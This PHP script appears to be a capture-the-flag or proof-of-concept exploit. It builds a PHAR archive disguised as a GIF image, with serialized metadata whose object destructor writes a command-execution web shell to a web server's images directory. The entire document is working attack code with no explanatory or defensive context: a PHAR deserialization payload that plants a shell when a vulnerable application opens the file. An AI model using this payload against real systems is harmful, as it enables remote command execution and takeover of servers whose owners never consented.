<?php
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL)
    {
        $this->title = $title;
        $this->author = $author;
        $this->content = $content;
        $this->filename = "/var/www/html/images/yahallo/shell.php";
    }
    function __destruct()
    {
        if ($this->content != NULL) {
            file_put_contents($this->filename, $this->content);
        }
    }
}
$phar = new Phar("attack.phar.gif");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER();");
$meme = new Meme("yahallo", "yahallo", "<?= system(\$_GET[\"a\"]) ?>");
$phar->setMetadata($meme);
$phar->addFromString("yahallo.gif", "yahallo");
$phar->stopBuffering();
